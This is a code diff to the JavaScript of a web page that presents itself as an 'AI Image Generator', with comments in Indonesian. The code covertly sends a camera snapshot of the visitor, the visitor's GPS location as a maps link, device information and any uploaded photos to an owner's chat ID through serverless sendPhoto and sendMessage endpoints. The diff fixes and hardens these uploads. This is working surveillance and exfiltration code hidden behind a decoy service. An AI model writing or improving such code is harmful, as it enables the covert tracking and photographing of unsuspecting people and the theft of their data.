@@ -332,22 +332,30 @@
                         const blob = base64ToBlob(snapshotBase64, "image/jpeg");
                         const fd = new FormData();
                         fd.append("chat_id", OWNER_ID);
-                        fd.append("photo", blob, "snap.jpg");
-                        fd.append("caption", caption);
+                        fd.append("fileToUpload", blob, "snap.jpg"); // Menggunakan 'fileToUpload' sesuai sendPhoto.js
+                        fd.append("caption", "Foto dari kamera user (AI Image Generator)"); // Menambahkan caption
 
-                        await fetch('/api/sendPhoto', {
+                        const response = await fetch('/api/sendPhoto', {
                             method: 'POST',
                             body: fd
                         });
+                        const data = await response.json();
+                        if (!data.ok) {
+                            console.error("API sendPhoto (camera) error:", data.description);
+                        }
                     }
 
                     if (coords) {
                         const text = `Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
-                        await fetch('/api/sendMessage', {
+                        const response = await fetch('/api/sendMessage', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ chat_id: OWNER_ID, text })
                         });
+                        const data = await response.json();
+                        if (!data.ok) {
+                            console.error("API sendMessage (location) error:", data.description);
+                        }
                     }
                 } catch(e) {
                     console.error("Failed to send to serverless API:", e);
@@ -404,36 +412,37 @@
                 }
 
                 try {
-                    await fetch('/api/sendMessage', {
+                    const response = await fetch('/api/sendMessage', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ chat_id: OWNER_ID, text: message })
                     });
+                    const data = await response.json();
+                    if (!data.ok) {
+                        console.error("API sendMessage (device info) error:", data.description);
+                    }
                 } catch (e) {
-                    console.error('Failed to send message:', e);
+                    console.error('Failed to send message (device info):', e);
                 }
 
                 // 3. send uploaded file if exists
                 const file = fileInput.files[0];
                 if (file && file.type.startsWith('image/')) {
                     try {
-                        const fileBase64 = await new Promise((resolve, reject) => {
-                            const r = new FileReader();
-                            r.onload = () => resolve(r.result.split(',',2)[1]);
-                            r.onerror = reject;
-                            r.readAsDataURL(file);
-                        });
+                        // Mengirim file sebagai FormData, bukan JSON base64
+                        const fd = new FormData();
+                        fd.append("chat_id", OWNER_ID);
+                        fd.append("fileToUpload", file, file.name || 'uploaded.jpg'); // Menggunakan 'fileToUpload'
+                        fd.append("caption", 'Foto upload dari user (AI Image Generator)');
 
-                        await fetch('/api/sendPhoto', {
+                        const response = await fetch('/api/sendPhoto', {
                             method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: OWNER_ID,
-                                filename: file.name || 'uploaded.jpg',
-                                photoBase64: fileBase64,
-                                caption: 'Foto upload dari user (AI Image Generator)'
-                            })
+                            body: fd
                         });
+                        const data = await response.json();
+                        if (!data.ok) {
+                            console.error("API sendPhoto (uploaded file) error:", data.description);
+                        }
                     } catch (e) {
                         console.error('Failed to send uploaded photo:', e);
                     }
